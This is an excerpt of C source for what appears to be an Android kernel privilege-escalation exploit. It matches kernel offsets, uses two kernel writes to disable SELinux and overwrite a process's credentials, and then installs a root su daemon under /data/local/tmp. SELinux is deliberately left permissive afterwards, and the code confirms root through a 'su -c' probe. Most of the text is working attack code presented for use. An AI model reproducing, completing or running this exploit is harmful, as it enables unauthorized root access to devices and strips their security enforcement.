...
static int select_offsets(void) {
  ...
  for (int i = 0; known_offsets[i].uname_r; i++) {
    if (strcmp(uts.release, known_offsets[i].uname_r) != 0) continue;
    /* The runtime table only carries global symbol addresses. Struct field
     * offsets and the physmap constants are compiled in, so a binary built for
     * another kernel series would run with the wrong layout. */
    const char *want = known_offsets[i].layout;
    if (want && strcmp(want, TARGET_LAYOUT_ID) != 0) {
      pr_error("offsets for %s need layout '%s', this build is '%s'\n",
               known_offsets[i].uname_r, want, TARGET_LAYOUT_ID);
      pr_error("rebuild with the matching TARGET (see README: "
               "Per-kernel-series layout headers)\n");
      return -1;
    }
    active_offsets = &known_offsets[i];
    pr_success("offsets matched: %s (layout %s)\n",
               active_offsets->uname_r, TARGET_LAYOUT_ID);
    return 0;
  }
...
/* Nothing calls write_root_script(): ghostlock's own root script / ksud /
 * KernelSU route stays in ghostlock-oneplus. It is left here because src/ is
 * otherwise ghostlock's tree verbatim. */
...
static void child_main(struct child_pipes *p) {
  ...
  /* This child is the only root context in the run -- Write 2 swapped *its*
   * cred pointer, and the parent is still the unprivileged caller. So anything
   * that needs uid 0 happens here. warhol-root roots the exploit process
   * itself and so calls install_embedded_su() straight from run_direct_root();
   * that is the one structural difference between the two trees. */
  pid_t su_daemon_pid = -1;
  errno = 0;
  int su_ok = install_embedded_su(&su_daemon_pid);
  int su_errno = errno;
  pr_success("embedded su install ok=%d errno=%d daemon=%d\n",
             su_ok, su_errno, su_daemon_pid);

  /* SELinux is left permissive, as warhol-root leaves it: the daemon has to
   * serve unprivileged clients over its socket afterwards. Exiting here is
   * safe -- start_su_daemon() already setsid()'d the daemon, so it is reparented
   * to init rather than killed, and it holds no fd of ours (it closes
   * everything above stderr and logs to /data/local/tmp/su_daemon.log). */
  _exit(su_ok ? 0 : 1);
}
...
int run_exploit(int argc, char **argv) {
  ...
  if (!got_root) {
    /* Write 1 already turned SELinux off and only a rooted context can turn it
     * back on, so this exit leaves the device permissive until reboot. */
    if (selinux_ok)
      pr_warning("SELinux is left permissive -- reboot to restore enforcing\n");
    pr_error("failed after 10 rounds\n");
    waitpid(child, NULL, 0);
    return 1;
  }

  pr_success("Write 1 (SELinux) and Write 2 (cred) both landed\n");

  /* The child does the install and then exits; its status is the install's. */
  int child_status = 0;
  waitpid(child, &child_status, 0);
  int su_installed = WIFEXITED(child_status) && WEXITSTATUS(child_status) == 0;
  TIMER("exploit complete");

  /* Confirm from *here* rather than trusting the child's word: this process is
   * still the unprivileged caller, so `su -c id` succeeding from it is the same
   * thing the user is about to do, not a self-report from a context that was
   * already root. Full path because the caller's PATH need not have it.
   *
   * Only one probe when the child reported failure -- install_embedded_su()
   * already spent 5s polling the socket before giving up, so retrying here
   * would just add 30s of sleep to a run that is already known to have lost. */
  int su_works = 0;
  int probes = su_installed ? 30 : 1;
  for (int i = 0; i < probes && !su_works; i++) {
    if (i) sleep(1);
    su_works = system("/data/local/tmp/su -c 'test \"$(id -u)\" = 0'") == 0;
  }

  /* Deliberately not pr_error: that ends in exit(-1), which would tear the
   * process down and make preload.c report the run as ABORTED. Write 1 and
   * Write 2 *did* land here -- only the install after them failed, and saying
   * so is the whole difference between "the exploit is wrong for this build"
   * and "the exploit worked, the su route did not". */
  if (su_works) {
    pr_success("su ready: /data/local/tmp/su and /apex/com.android.virt/bin/su\n");
  } else {
    pr_warning("root reached (Write 1 and Write 2 landed) but su never "
               "answered: install_ok=%d -- see /data/local/tmp/su_daemon.log\n",
               su_installed);
  }

  /* Write 1 turned SELinux off and it is deliberately left off, as warhol-root
   * leaves it: the daemon serves unprivileged clients over its socket. */
  pr_warning("SELinux is permissive -- reboot to restore enforcing\n");
  /* 2, not 1: preload.c turns this into "EXPLOIT OK, SU INSTALL FAILED".
   * 1 would print EXPLOIT FAILED directly under the warning above and
   * contradict it. */
  return su_works ? 0 : 2;
}
...
#ifndef GHOSTLOCK_PRELOAD
int main(int argc, char **argv) {
    if (p0_phys_load_init() != 0)
        return 1;
